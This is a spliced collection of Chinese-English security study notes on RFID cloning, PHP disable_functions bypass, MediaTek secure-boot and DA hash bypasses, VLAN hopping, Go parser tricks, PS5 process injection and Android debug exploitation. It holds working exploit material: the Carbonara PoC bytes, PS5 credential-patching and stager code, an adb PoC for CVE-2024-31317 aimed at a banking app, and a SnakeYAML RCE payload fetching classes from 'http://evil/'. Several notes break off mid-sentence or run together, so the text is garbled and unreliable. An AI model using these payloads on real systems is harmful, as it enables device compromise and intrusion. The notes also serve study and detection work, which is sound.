content: 来源路径： 02-知识点/防御检测与OPSEC/Pentesting RFID 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Pentesting RFID 技术笔记 [!summary] 提炼定位 面向 防御检测与 OPSEC 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 围绕 Pentesting RFID 技术笔记 建立检测、规避、溯源或 OPSEC 检查。 把行为、进程链、网络、文件、日志事件转化为可验证线索。 # 中文提炼 核心目标是围绕 Pentesting RFID 技术笔记 建立行为证据、检测逻辑和操作暴露面。 优先关注：Pentesting RFID、Introduction、Classes、Information Stored in RFID Tags、Low & High frequency tags comparison；把命令、进程、文件、网络、注册表 / 日志事件映射到检测字段。 区分正常管理行为与攻击行为，避免只按工具名告警；优先写可复现的查询条件。 OPSEC 记录应包括噪声来源、持久化痕迹、清理步骤和不可规避风险。 本页已沉淀 11 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Pentesting RFID Introduction Classes Information Stored in RFID Tags Low & High frequency tags comparison Low-Frequency RFID Tags (125kHz) Attack High-Frequency RFID Tags (13.56 MHz) MiFare Classic offline stored-value tampering (broken Crypto1) Building a Portable HID MaxiProx 125 kHz Mobile Cloner NFC/EMV Relay via Android Reader↔HCE Emitter # 核心要点 An RFID tag can rely on its own power source (active), such as an embedded battery, or receive its power from the reading antenna using the current induced from the received radio waves (passive). Class 5 tags can provide power to other tags and communicate with all the previous tag classes. Class 5 tags can act as RFID readers. Long Range — lower frequency translates to higher range. There are some EM-Marin and HID readers, which work from a distance of up to a meter. These are often used in car parking. Primitive protocol — due to the low data transfer rate these tags can only transmit their short ID. In most cases, data is not authenticated and it's not protected in any way. As soon as the card is in the range of the reader it just starts transmitting its ID. Low security — These cards can be easily copied, or even read from somebody else's pocket due to the protocol's primitiveness. EM-Marin — EM4100, EM4102. The most popular protocol in CIS. Can be read from about a meter because of its simplicity and stability. HID Prox II — low-frequency protocol introduced by HID Global. This protocol is more popular in the western countries. It is more complex and the cards and readers for this protocol are relatively expensive. High-frequency tags are used for a more complex reader-tag interaction when you need cryptography, a large two-way data transfer, 认证，etc.\ Only UID-changeable tags ("Chinese magic" gen1a/gen2) allow writing block 0/UID. Normal Classic cards have read-only UIDs. Reader-mode app (victim): uses NFC reader APIs to parse EMV (PAN/expiry/AIDs), displays scheme by AID, asks for PIN and exfiltrates immediately. Server→Client: int32 len | body (opcode inside 载荷) Native lib derives a 32-byte key as SHA‑256 of the app signing certificate (DER). # 命令 / 载荷 / 操作片段 # 1. MiFare Classic offline stored-value tampering (broken Crypto1) 12# Attempt all built-in Classic key recovery attacks and dump the cardhf mf autopwn # 2. Use the flow below on PHP 5/7 targets; on newer PHP expect to downgrade or switch to another injection path (e.g., userland FFI). Fetch perl-1.0.1 from PECL, compile it for the PHP branch you plan to attack, and load it globally (php.ini) or via dl() (if permitted). During 利用 confirm availability with var dump (extension loaded ('perl')); or print r (get loaded extensions ());. If absent, search for perl.so or abuse writable php.ini/.user.ini entries to force-load it. If phpize and build-essential are present on the compromised host, you can compile and drop perl.so without shelling out to the OS: From http://blog.safebuff.com/2016/05/06/disable-functions - 绕过 /, still handy to confirm the extension responds to eval: Perl ignores PHP’s open basedir, so you can read arbitrary files: Build or 上传 a compatible perl.dll/perl.so to a web-writable path (e.g., C:\xampp\htdocs\temp\perl.dll). Send a single HTTP request that injects -d extension=C:\xampp\htdocs\temp\perl.dll and, in the same request body, a Perl-backed 载荷: # 命令 / 载荷 / 操作片段 # 1. Building a Testable Environment in 2025 1234sudo apt install php5.6 php5.6-dev php-pear build-essential sudo pecl install perl-1.0.1 echo "extension=perl.so" | sudo tee /etc/php/5.6/mods-available/perl.ini sudo phpenmod perl && sudo systemctl restart apache2 # 2. content: 来源路径： 02-知识点/防御检测与OPSEC/Memory Tagging Extension (MTE) 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Memory Tagging Extension (MTE) 技术笔记 [!summary] 提炼定位 面向 防御检测与 OPSEC 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 围绕 Memory Tagging Extension (MTE) 技术笔记 建立检测、规避、溯源或 OPSEC 检查。 把行为、进程链、网络、文件、日志事件转化为可验证线索。 # 中文提炼 核心目标是围绕 Memory Tagging Extension (MTE) 技术笔记 建立行为证据、检测逻辑和操作暴露面。 优先关注：Memory Tagging Extension (MTE)、Basic Information、How Memory Tagging Extension Works、MTE Pointer Tags、MTE Memory Tags；把命令、进程、文件、网络、注册表 / 日志事件映射到检测字段。 区分正常管理行为与攻击行为，避免只按工具名告警；优先写可复现的查询条件。 OPSEC 记录应包括噪声来源、持久化痕迹、清理步骤和不可规避风险。 本页已沉淀 1 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Memory Tagging Extension (MTE) Basic Information How Memory Tagging Extension Works MTE Pointer Tags MTE Memory Tags Checking Modes Sync Async Mixed Implementation & 检测 Examples Speculative Tag Leakage (TikTag) # 核心要点 Per-core preferences (for example writing sync, async or asymm to /sys/devices/system/cpu/cpu*/mte tcf preferred) let kernels silently upgrade or downgrade per-process requests, so production builds usually request ASYNC while privileged cores force SYNC when workload allows it. The tag 0xF is the match all pointer. A memory with this pointer allows any tag to be used to access its memory (no mismatches). This could prevent MTE from detecting an attack if that tag is being used in the attacked memory. When kfree() is executed, the memory is retagged with the invalid memory tag, so in a use-after-free, when the memory is accessed again, the mismatch is detected. However, in a use-after-free, if the same chunk is reallocated again with the SAME tag as previously, an attacker will be able to use this access and this won't be detected (around 7% chance). When a mismatch is detected the kernel will panic to prevent further 利用 and retries of the 利用 (MTE doesn't have false positives). # 命令 / 载荷 / 操作片段 # 1. MTE Memory Tags 1234STG [<Xn/SP>], #<simm> Store Allocation (memory) TagLDG <Xt>, [<Xn/SP>] Load Allocatoin (memory) TagIRG <Xd/SP>, <Xn/SP> Insert Random [pointer] Tag... # 工具与参考入口 https://www.youtube.com/watch?v=UwMt0e dC Q TikTag: Breaking ARM's Memory Tagging Extension with Speculative Execution # 检查清单 是否提取进程链 / 命令行 / 网络 / 文件 / 日志线索 是否区分攻击行为和正常管理行为 是否记录绕过假设与限制 是否形成检测规则或查询语句 # 关联 防御检测与 OPSEC 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

title: MediaTek bl2 ext Secure-Boot 绕过 (EL3 Code Execution)
content: 来源路径： 02-知识点/防御检测与OPSEC/MediaTek bl2 ext Secure-Boot 绕过 (EL3 Code Execution).md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # MediaTek bl2 ext Secure-Boot 绕过 (EL3 Code Execution) [!summary] 提炼定位 面向 防御检测与 OPSEC 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 围绕 MediaTek bl2 ext Secure-Boot 绕过 (EL3 Code Execution) 建立检测、规避、溯源或 OPSEC 检查。 把行为、进程链、网络、文件、日志事件转化为可验证线索。 # 中文提炼 核心目标是围绕 MediaTek bl2 ext Secure-Boot 绕过 (EL3 Code Execution) 建立行为证据、检测逻辑和操作暴露面。 优先关注：Affected boot flow (MediaTek)、Root cause、Practical 利用 chain、Triage (expdb boot logs)、Verification logic locations；把命令、进程、文件、网络、注册表 / 日志事件映射到检测字段。 区分正常管理行为与攻击行为，避免只按工具名告警；优先写可复现的查询条件。 OPSEC 记录应包括噪声来源、持久化痕迹、清理步骤和不可规避风险。 本页已沉淀 2 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Affected boot flow (MediaTek) Root cause Practical 利用 chain Triage (expdb boot logs) Verification logic locations Fenrir PoC workflow (Nothing/CMF) EL3 patching notes Implications Device notes MTK DA readback and seccfg manipulation with Penumbra # 核心要点 Vulnerable path: When seccfg is set to unlocked, Preloader may skip verifying bl2 ext. Preloader still jumps into bl2 ext at EL3, so a crafted bl2 ext can load unverified components thereafter. bl2 ext executes at EL3 and is responsible for verifying TEE, GenieZone, LK/AEE and the kernel. If bl2 ext itself is not authenticated, the rest of the chain is trivially bypassed. On affected devices, the Preloader does not enforce 认证 of the bl2 ext partition when seccfg indicates an "unlocked" state. This allows flashing an attacker-controlled bl2 ext that runs at EL3. Obtain bootloader partitions (Preloader, bl2 ext, LK/AEE, etc.) via OTA/firmware packages, EDL/DA readback, or hardware dumping. If the device is configured as locked (seccfg locked), the Preloader is expected to verify bl2 ext. In that configuration, this attack will fail unless another 漏洞 permits loading an unsigned bl2 ext. Dump boot/expdb logs around the bl2 ext load. If img auth required = 0 and certificate verification time is ~0 ms, verification is likely skipped. The patched version forces the function to return success or to 绕过 the verification call entirely. Replace its body with a stub that immediately returns success, or overwrite the conditional branch that handles verification failure. Flash the resulting 载荷 (fastboot helper provided). bl2 ext executes in ARM EL3. Crashes here can brick a device until reflashed via EDL/DA or test points. Ability to boot unsigned TEE/GZ/LK/Kernel, bypassing secure/verified boot expectations and enabling persistent compromise. NothingOS 4 stable (BP2A.250605.031.A3, Nov 2025) re-enabled bl2 ext verification; fenrir pacman-v2.0 restores the 绕过 by mixing the beta Preloader with a patched LK Security impact: Successful seccfg unlocking reopens flashing paths for unsigned boot images, enabling persistent compromises such as the bl2 ext EL3 patching described above. Partition readback provides firmware artifacts for 逆向工程 and crafting modified images. # 命令 / 载荷 / 操作片段 # 1. Triage (expdb boot logs) 123[PART] img_auth_required = 0[PART] Image with header, name: bl2_ext, addr: FFFFFFFFh, mode: FFFFFFFFh, size:654944, magic:58881688h[PART] part: lk_a img: bl2_ext cert vfy(0 ms) # 2. Fenrir PoC workflow (Nothing/CMF) 123./build.sh pacman # build from bin/pacman.bin./build.sh pacman /path/to/boot.bin # build from a custom bootloader path./flash.sh # flash via fastboot # 工具与参考入口 Fenrir – MediaTek bl2 ext secure‑boot 绕过 (PoC) Fenrir pacman-v2.0 release (NothingOS 4 绕过 bundle) The Cyber Express – Fenrir PoC breaks secure boot on Nothing Phone 2a/CMF1 Penumbra – MTK DA flash/readback & seccfg tooling # 检查清单 是否提取进程链 / 命令行 / 网络 / 文件 / 日志线索 是否区分攻击行为和正常管理行为 是否记录绕过假设与限制 是否形成检测规则或查询语句 # 关联 防御检测与 OPSEC 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

title: MediaTek XFlash Carbonara DA2 哈希 绕过
content: 来源路径： 02-知识点/防御检测与OPSEC/MediaTek XFlash Carbonara DA2 哈希 绕过.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # MediaTek XFlash Carbonara DA2 哈希 绕过 [!summary] 提炼定位 面向 防御检测与 OPSEC 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 围绕 MediaTek XFlash Carbonara DA2 哈希 绕过 建立检测、规避、溯源或 OPSEC 检查。 把行为、进程链、网络、文件、日志事件转化为可验证线索。 # 中文提炼 核心目标是围绕 MediaTek XFlash Carbonara DA2 哈希 绕过 建立行为证据、检测逻辑和操作暴露面。 优先关注：Trust boundary in XFlash (DA1 → DA2)、Carbonara flow ("two BOOT TO" trick)、Minimal PoC pattern (mtkclient-style)、Patch landscape (hardened loaders)、Post-Carbonara (heapb8) note；把命令、进程、文件、网络、注册表 / 日志事件映射到检测字段。 区分正常管理行为与攻击行为，避免只按工具名告警；优先写可复现的查询条件。 OPSEC 记录应包括噪声来源、持久化痕迹、清理步骤和不可规避风险。 本页已沉淀 1 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Trust boundary in XFlash (DA1 → DA2) Carbonara flow ("two BOOT TO" trick) Minimal PoC pattern (mtkclient-style) Patch landscape (hardened loaders) Post-Carbonara (heapb8) note Notes for triage and hardening # 核心要点 DA1 is signed/loaded by BootROM/Preloader. When 下载 Agent 授权 (DAA) is enabled, only signed DA1 should run. DA2 is sent over USB. DA1 receives size, load address, and SHA-256 and hashes the received DA2, comparing it to an expected 哈希 embedded in DA1 (copied into RAM). Weakness: On unpatched loaders, DA1 does not sanitize the DA2 load address/size and keeps the expected 哈希 writable in memory, enabling the host to tamper with the check. First BOOT TO: Enter the DA1→DA2 staging flow (DA1 allocates, prepares DRAM, and exposes the expected - 哈希 buffer in RAM). 哈希 - slot overwrite: Send a small 载荷 that scans DA1 memory for the stored DA2-expected 哈希 and overwrites it with the SHA-256 of the attacker-modified DA2. This leverages the user-controlled load to land the 载荷 where the 哈希 resides. Second BOOT TO + digest: Trigger another BOOT TO with the patched DA2 metadata and send the raw 32-byte digest matching the modified DA2. DA1 recomputes SHA-256 over the received DA2, compares it against the now-patched expected 哈希，and the jump succeeds into attacker code. 载荷 replicates the paid-tool blob that patches the expected - 哈希 buffer inside DA1. DA2 can be any attacker-built image; choosing the load address/size allows arbitrary memory placement with cache invalidation handled by DA. Mitigation: Updated DAs hardcode the DA2 load address to 0x40000000 and ignore the address the host supplies, so writes cannot reach the DA1 哈希 slot (~0x200000 range). The 哈希 remains computed but no longer attacker-writable. Detecting patched DAs: mtkclient/penumbra scan DA1 for patterns indicating the address-hardening; if found, Carbonara is skipped. Old DAs expose writable 哈希 slots (commonly around offsets like 0x22dea4 in V5 DA1) and remain exploitable. Devices where DA2 address/size are unchecked and DA1 keeps the expected 哈希 writable are vulnerable. If a later Preloader/DA enforces address bounds or keeps the 哈希 immutable, Carbonara is mitigated. Enabling DAA and ensuring DA1/Preloader validate BOOT TO parameters (bounds + authenticity of DA2) closes the primitive. Closing only the 哈希 patch without bounding the load still leaves arbitrary write risk. # 命令 / 载荷 / 操作片段 # 1. Minimal PoC pattern (mtkclient-style) 12345678if self.xsend(self.Cmd.BOOT_TO): payload = bytes.fromhex("a4de2200000000002000000000000000") if self.xsend(payload) and self.status() == 0: import hashlib da_hash = hashlib.sha256(self.daconfig.da2).digest() if self.xsend(da_hash): self.status() self.info("All good!") # 工具与参考入口 Carbonara: The MediaTek 利用 nobody served Carbonara 利用 documentation Penumbra Carbonara source code heapb8: exploiting patched V6 下载 Agents # 检查清单 是否提取进程链 / 命令行 / 网络 / 文件 / 日志线索 是否区分攻击行为和正常管理行为 是否记录绕过假设与限制 是否形成检测规则或查询语句 # 关联 防御检测与 OPSEC 总览 知识地图 Pwn 基础链路 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

Project Zero used Jann Horn's tracing-BPF helper (bpf arb read) to dump it directly: Harvest PFNs: read /proc/pagemap for each page (or use another PFN leak) to collect the backing PFN list. Repeat and profile: reboot, rerun 100×, build a histogram showing how often each PFN was attacker-controlled. Some PFNs are white-hot (allocated 100/100 times shortly after boot). Root or use a kernel read primitive to dump memstart addr, stext, and the target symbol from /proc/kallsyms. Apply the offset math above and cache the resulting linear-map VAs in your 利用. For PFN spraying, keep a list of "reliable" PFNs that repeatedly land in attacker memory. When an arbitrary write is available, directly patch targets such as modprobe path, init cred, or security ops arrays at the precomputed addresses. Use bpf arb read or any safe read primitive to sanity-check that the computed address contains the expected bytes before destructive writes. # 命令 / 载荷 / 操作片段 # 1. The previous method assumes authenticated console or Telnet/SSH access to the switch. In real-world engagements the attacker is usually connected to a regular access port. The following Layer-2 tricks often let you pivot laterally without ever logging into the switch OS: 侦察 helper (passively fingerprint the port’s DTP state): If the attacker sits on the native (untagged) VLAN, a crafted frame with two 802.1Q headers can hop to a second VLAN even when the port is locked in access mode. Tooling such as VLANPWN DoubleTagging.py (2022-2025 refresh) automates the injection: Many enterprise cores support Q-in-Q service-provider encapsulation. Where permitted, an attacker can tunnel arbitrary 802.1Q-tagged traffic inside a provider (S-tag) to cross security zones. Capture for ethertype 0x88a8 and attempt to pop the outer tag with Scapy: The technique bypasses data/voice separation and is extremely common on enterprise edge switches in 2025 because LLDP auto-policy is enabled by default on many models . CVE-2022-20728† – Cisco Aironet/Catalyst Access Points allow injection from the native VLAN into non-native WLAN VLANs, bypassing wired/wireless segmentation . CVE-2024-20465 (Cisco IOS Industrial Ethernet) permits ACL 绕过 on SVIs after toggling Resilient Ethernet Protocol, leaking traffic between VRFs/VLANs. Patch 17.9.5 or later. # 命令 / 载荷 / 操作片段 # 1. And the following is for generating the real Python 利用. LOAD CONST consti → reads co consts[consti]. Use EXTENDED ARG or multiple bytes of arg to reach indexes >255 if needed. These issues were published in this blog post. Go’s JSON, XML, and YAML parsers have a long trail of inconsistencies and insecure defaults that can be abused to 绕过 认证，escalate privileges, or exfiltrate sensitive data. The goal is to 利用 structs that allow an attacker to read/write sensitive fields (e.g., IsAdmin, 密码). Common Vulnerabilities The goal is to 绕过 授权 by exploiting how different parsers interpret the same 载荷 differently like in: CVE-2017-12635: Apache CouchDB 绕过 via duplicate keys GitLab 2025 SAML 绕过 via XML quirks Go sees AdminAction, executes it CVE-2020-16250: HashiCorp Vault parsed JSON with an XML parser after STS returned JSON instead of XML. One-liner PoC (will open the calculator on vulnerable host): Issue: Calling yaml event delete () twice leads to a double-free that attackers can turn into DoS or, in some scenarios, heap 利用. Bug: In GenericReader::ParseNumber () unchecked arithmetic lets attackers craft huge numeric literals that wrap around and corrupt the heap — ultimately enabling privilege-escalation when the resulting object graph is used for 授权 decisions. # 命令 / 载荷 / 操作片段 # 1. (Un)Marshaling Unexpected Data 12345type User struct { Username string `json:"username,omitempty"` Password string `json:"password,omitempty"` IsAdmin bool `json:"-"`} # 2. (Un)Marshaling Unexpected Data 123type User struct { IsAdmin bool `json:"-,omitempty"` // ❌ wrong} # 5. (Un)Marshaling Unexpected Data 1{"-": true} # 6. (Un)Marshaling Unexpected Data 123type User struct { IsAdmin bool `json:"-"`} # 7. Parser Differentials 12json.Unmarshal([]byte(`{"action":"UserAction", "action":"AdminAction"}`), &req)fmt.Println(req.Action) // AdminAction # 8. Parser Differentials 12json.Unmarshal([]byte(`{"AcTiOn":"AdminAction"}`), &req)// matches `Action` field # 9. Parser Differentials 1json.Unmarshal([]byte(`{"aKtionſ": "bypass"}`), &req) # 10. Parser Differentials 1234{ "action": "UserAction", "AcTiOn": "AdminAction"} # 11. Data Format Confusion (Polyglots) 12345{ "action": "Action_1", "AcTiOn": "Action_2", "ignored": "<?xml version=\"1.0\"?><Action>Action_3</Action>"} # 12. SnakeYAML Deserialization RCE (CVE-2022-1471) 1!!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL ["http://evil/"] ] ] ] # 工具与参考入口 this blog post jsoncheck # 检查清单 是否提取进程链 / 命令行 / 网络 / 文件 / 日志线索 是否区分攻击行为和正常管理行为 是否记录绕过假设与限制 是否形成检测规则或查询语句 # 关联 防御检测与 OPSEC 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

By replacing one or more Latin characters with their look-alike counterparts, an attacker can craft: Display names, subjects or message bodies that look legitimate to the human eye but 绕过 keyword-based detections. Register supporting infrastructure – Optionally register a homoglyph domain and obtain a TLS certificate (most CAs do no visual similarity checks). Redirect chain – Victim is bounced through seemingly benign websites or URL shorteners before landing on the malicious host that harvests 凭据 /delivers malware. 工具 such as dnstwist (--homoglyph) or urlcrazy can enumerate visually-similar domain permutations and are useful for proactive takedown / monitoring. Implement the 检测 logic above in Secure Email Gateways and SIEM/XSOAR playbooks. # 命令 / 载荷 / 操作片段 # 1. Mixed-Script Inspection 1234567891011121314151617181920import unicodedata as udfrom collections import defaultdictSUSPECT_FIELDS = { "display_name": "Ηоmоgraph Illusion", # example data "subject": "Finаnꮯiаl Տtatеmеnt", "url": "https://xn--messageconnecton-2kb.blob.core.windows.net" # punycode}for field, value in SUSPECT_FIELDS.items(): blocks = defaultdict(int) for ch in value: if ch.isascii(): blocks['Latin'] += 1 else: name = ud.name(ch, 'UNKNOWN') block = name.split(' ')[0] # e.g., 'CYRILLIC' blocks[block] += 1 if len(blocks) > 1: print(f"[!] Mixed scripts in {field}: {dict(blocks)} -> {value}") # 2. Punycode Normalisation (Domains) 1234import idnahostname = "Ρаypal.com" # Greek Rho + Cyrillic apuny = idna.encode(hostname).decode()print(puny) # xn--yl8hpyal.com # 工具与参考入口 unicode.org The Homograph Illusion: Not Everything Is As It Seems dnstwist – domain permutation engine # 检查清单 是否提取进程链 / 命令行 / 网络 / 文件 / 日志线索 是否区分攻击行为和正常管理行为 是否记录绕过假设与限制 是否形成检测规则或查询语句 # 关联 防御检测与 OPSEC 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

The boundary scan analyzes certain circuitry, including embedded boundary-scan cells and registers for each pin. The JTAG standard defines specific commands for conducting boundary scans, including the following: 绕过 allows you to test a specific chip without the overhead of passing through other chips. EXTEST sets and reads pin states. Boundary scans include tests of the four-wire Test Access Port (TAP), a general-purpose port that provides access to the JTAG test support functions built into a component. TAP uses the following five signals: Test data input (TDI) TDI is the pin that sends data into the chip through the scan cells. Each vendor is responsible for defining the communication protocol over this pin, because JTAG doesn’t define this. # 工具与参考入口 JTAGenum https://www.tag-connect.com/info/ # 检查清单 是否提取进程链 / 命令行 / 网络 / 文件 / 日志线索 是否区分攻击行为和正常管理行为 是否记录绕过假设与限制 是否形成检测规则或查询语句 # 关联 防御检测与 OPSEC 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

来源路径： 02-知识点/防御检测与OPSEC/FreeBSD ptrace RFI and vm map PROT EXEC 绕过 (PS5 case study).md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # FreeBSD ptrace RFI and vm map PROT EXEC 绕过 (PS5 case study) [!summary] 提炼定位 面向 防御检测与 OPSEC 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 围绕 FreeBSD ptrace RFI and vm map PROT EXEC 绕过 (PS5 case study) 建立检测、规避、溯源或 OPSEC 检查。 把行为、进程链、网络、文件、日志事件转化为可验证线索。 # 中文提炼 核心目标是围绕 FreeBSD ptrace RFI and vm map PROT EXEC 绕过 (PS5 case study) 建立行为证据、检测逻辑和操作暴露面。 优先关注：Overview、Kernel data-only primitives、Process discovery via allproc、Elevate 凭据 for debugging (ucred)、Bypassing RW-only user mappings: vm map PROT EXEC flip；把命令、进程、文件、网络、注册表 / 日志事件映射到检测字段。 区分正常管理行为与攻击行为，避免只按工具名告警；优先写可复现的查询条件。 OPSEC 记录应包括噪声来源、持久化痕迹、清理步骤和不可规避风险。 本页已沉淀 7 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Overview Kernel data-only primitives Process discovery via allproc Elevate 凭据 for debugging (ucred) Bypassing RW-only user mappings: vm map PROT EXEC flip Remote Function Invocation (RFI) with ptrace Threaded stager and clean detach End-to-end pipeline (PS5 reference implementation) Practical considerations Public tooling # 核心要点 This page documents a practical Unix/BSD usermode process/ELF injection technique on PlayStation 5 (PS5), which is based on FreeBSD. The method generalizes to FreeBSD derivatives when you already have kernel read/write (R/W) primitives. High level: Patch the current process 凭据 (ucred) to grant debugger authority, enabling ptrace/mdbg on arbitrary user processes. 绕过 PROT EXEC restrictions by flipping vm map entry.protection |= PROT EXEC in the target’s vm map via kernel data writes. Use ptrace to perform Remote Function Invocation (RFI): suspend a thread, set registers to call arbitrary functions inside the target, resume, collect return values, and restore state. Map and run arbitrary ELF 载荷 inside the target using an in-process ELF loader, then spawn a dedicated thread that runs your 载荷 and triggers a breakpoint to detach cleanly. PS5 hypervisor mitigations worth noting (contextualized for this technique): XOM (execute-only .text) prevents reading/writing kernel .text. Clearing CR0.WP or disabling CR4.SMEP causes a hypervisor vmexit (crash). Only data-only kernel writes are viable. Userland mmap is restricted to PROT READ|PROT WRITE by default. Granting PROT EXEC must be done by editing vm map entries in kernel memory. After this write, the injector can attach and instrument user processes via ptrace/mdbg. Invoke helper routines to fetch returned entrypoints and 载荷 - args pointers. The SCEFunctions / 载荷 args pointers are provided by the loader/SDK glue. After the breakpoint and detach, the 载荷 continues in its own thread. Hypervisor protections force data-only kernel writes; do not attempt to patch CR0.WP or CR4.SMEP. # 命令 / 载荷 / 操作片段 # 1. Elevate 凭据 for debugging (ucred) 12345678910void set_ucred_to_debugger(){ struct proc* proc = get_proc_by_pid(getpid()); if (proc){ uintptr_t authid = 0; // read current (optional) uintptr_t ptrace_authid = 0x4800000000010003ULL; // debugger Authority ID kernel_copyout((uintptr_t)proc->p_ucred + 0x58, &authid, sizeof(uintptr_t)); kernel_copyin(&ptrace_authid, (uintptr_t)proc->p_ucred + 0x58, sizeof(uintptr_t)); free(proc); }} # 2. Bypassing RW-only user mappings: vm map PROT EXEC flip 12345678struct vm_map_entry { struct vm_map_entry *prev,*next,*left,*right; vm_offset_t start, end, avail_ssize; vm_size_t adj_free, max_free; union vm_map_object object; vm_ooffset_t offset; vm_eflags_t eflags; vm_prot_t protection; vm_prot_t max_protection; vm_inherit_t inheritance; int wired_count; vm_pindex_t lastr;}; # 3. Remote Function Invocation (RFI) with ptrace 123intptr_t entry = elfldr_load(target_pid, (uint8_t*)elf_in_target);intptr_t args = elfldr_payload_args(target_pid);printf("[+] ELF entrypoint: %#02lx
[+] Payload Args: %#02lx
", entry, args); # 4. Threaded stager and clean detach 1234567int __attribute__((section(".stager_shellcode$1"))) stager(SCEFunctions* functions){ pthread_t thread; functions->pthread_create_ptr(&thread, 0, (void*(*)(void*))functions->elf_main, functions->payload_args); asm("int3"); return 0;} # 5. End-to-end pipeline (PS5 reference implementation) 1234typedef struct __injector_data_t{ char proc_name[MAX_PROC_NAME]; Elf64_Ehdr elf_header;} injector_data_t; # 6. End-to-end pipeline (PS5 reference implementation) 1python3 ./send_injection_elf.py SceShellUI hello_world.elf <PS5_IP> # 7. End-to-end pipeline (PS5 reference implementation) 1234567#include <stdio.h>#include <unistd.h>#include <ps5/klog.h>int main(){ klog_printf("Hello from PID %d
", getpid()); return 0;} # 工具与参考入口 Usermode ELF injection on the PlayStation 5 ps5 - 载荷 - dev/sdk ps5 - 载荷 - dev/elfldr buzzer-re/NineS playstation research utils Mira gdbsrv FreeBSD klog reference # 检查清单 是否提取进程链 / 命令行 / 网络 / 文件 / 日志线索 是否区分攻击行为和正常管理行为 是否记录绕过假设

content: 来源路径： 02-知识点/防御检测与OPSEC/Exploiting a debuggeable application 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Exploiting a debuggeable application 技术笔记 [!summary] 提炼定位 面向 防御检测与 OPSEC 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 围绕 Exploiting a debuggeable application 技术笔记 建立检测、规避、溯源或 OPSEC 检查。 把行为、进程链、网络、文件、日志事件转化为可验证线索。 # 中文提炼 核心目标是围绕 Exploiting a debuggeable application 技术笔记 建立行为证据、检测逻辑和操作暴露面。 优先关注：Exploiting a debuggeable application、Bypassing root and debuggeable checks、Steps to Make an Android App Debuggable and 绕过 Checks、Making the App Debuggable、Bypassing Checks；把命令、进程、文件、网络、注册表 / 日志事件映射到检测字段。 区分正常管理行为与攻击行为，避免只按工具名告警；优先写可复现的查询条件。 OPSEC 记录应包括噪声来源、持久化痕迹、清理步骤和不可规避风险。 本页已沉淀 1 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Exploiting a debuggeable application Bypassing root and debuggeable checks Steps to Make an Android App Debuggable and 绕过 Checks Making the App Debuggable Bypassing Checks Exploiting a 漏洞 Checking for 漏洞 Preparing the Setup Injecting Code at Runtime 2024 – Turning any application into a debuggable process (CVE-2024-31317) Quick PoC 检测 & Mitigation # 核心要点 This section of the post is a summary from the post https://medium.com/@shubhamsonani/hacking-with-precision - 绕过 - techniques-via-debugger-in-android-apps-27fd562b2cc0 Content based on https://medium.com/@shubhamsonani/hacking-with-precision - 绕过 - techniques-via-debugger-in-android-apps-27fd562b2cc0 Execute adb shell pm list packages –3 to list third-party applications and find the package name. Command: adb shell am setup-debug-app –w <package name>. For 持久化，use adb shell am setup-debug-app –w ––persistent <package name>. To remove all flags, use adb shell am clear-debug-app <package name>. The presence of android debuggable="true" in the AndroidManifest.xml indicates the application is debuggable and susceptible to 利用. The process involved initiating an emulator, installing the vulnerable application, and using adb jdwp to identify Dalvik VM ports that are listening. The 利用 was carried out by setting breakpoints and controlling the application flow. The modified code was executed using the run command, successfully altering the application’s output in real-time. Restrict WRITE SECURE SETTINGS /shell access on production devices. The 利用 requires this permission, which is normally only held by ADB or OEM-privileged apps. On EMM/MDM-managed fleets, enforce ro.debuggable=0 and deny shell via adb disable-verifier. # 命令 / 载荷 / 操作片段 # 1. Quick PoC 1234567891011# Requires: adb shell (device must be <2024-06-01 patch-level)# 1. Inject a fake API-denylist exemption that carries the malicious Zygote flagadb shell settings put global hidden_api_blacklist_exemptions "--runtime-flags=0x104|Lcom/example/Fake;->entryPoint:"# 2. Launch the target app – it will be forked with DEBUG_ENABLE_JDWPadb shell monkey -p com.victim.bank 1# 3. Enumerate JDWP PIDs and attach with jdb / Android-Studioadb jdwp # obtain the PIDadb forward tcp:8700 jdwp:<pid>jdb -connect com.sun.jdi.SocketAttach:hostname=localhost,port=8700 # 工具与参考入口 https://miro.medium.com/v2/resize:fit:1400/1*-ckiSbWGSoc1beuxxpKbow.png https://rtx.meta.security/ 利用 / 2024/06/03/Android-Zygote-injection.html https://blog.flanker017.me/cve-2024-31317/ # 检查清单 是否提取进程链 / 命令行 / 网络 / 文件 / 日志线索 是否区分攻击行为和正常管理行为 是否记录绕过假设与限制 